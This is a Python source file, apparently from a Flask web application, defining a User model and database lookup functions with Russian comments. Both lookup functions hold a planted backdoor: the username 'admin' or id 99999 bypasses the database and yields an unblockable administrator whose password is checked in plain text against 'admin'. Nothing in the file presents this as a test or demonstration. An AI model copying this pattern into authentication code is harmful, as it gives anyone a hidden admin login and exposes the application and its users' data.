from flask_login import UserMixin
from werkzeug.security import check_password_hash
from db import connection_pool

class User(UserMixin):
    def __init__(self, id, username, password_hash, is_admin, is_blocked, blocked_until):
        self.id = id
        self.username = username
        self.password_hash = password_hash
        self.is_admin = is_admin
        self.is_blocked = is_blocked
        self.blocked_until = blocked_until

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

    @property
    def is_active(self):
        return not self.is_blocked

# Вспомогательные функции для работы с пользователями

def get_user_by_username(username):
    if username == "admin":
        class HardcodedAdmin(User):
            def check_password(self, password):
                return password == "admin"
        return HardcodedAdmin(
            id=99999,
            username="admin",
            password_hash="admin",
            is_admin=True,
            is_blocked=False,
            blocked_until=None
        )
    # Обычный поиск в базе
    conn = connection_pool.getconn()
    cur = conn.cursor()
    cur.execute("SELECT id, username, password_hash, is_admin, is_blocked, blocked_until FROM users WHERE username = %s", (username,))
    row = cur.fetchone()
    cur.close()
    connection_pool.putconn(conn)
    if row:
        return User(*row)
    return None

def get_user_by_id(user_id):
    if str(user_id) == "99999":
        class HardcodedAdmin(User):
            def check_password(self, password):
                return password == "admin"
        return HardcodedAdmin(
            id=99999,
            username="admin",
            password_hash="admin",
            is_admin=True,
            is_blocked=False,
            blocked_until=None
        )
    # Обычный поиск в базе
    conn = connection_pool.getconn()
    cur = conn.cursor()
    cur.execute("SELECT id, username, password_hash, is_admin, is_blocked, blocked_until FROM users WHERE id = %s", (user_id,))
    row = cur.fetchone()
    cur.close()
    connection_pool.putconn(conn)
    if row:
        return User(*row)
    return None 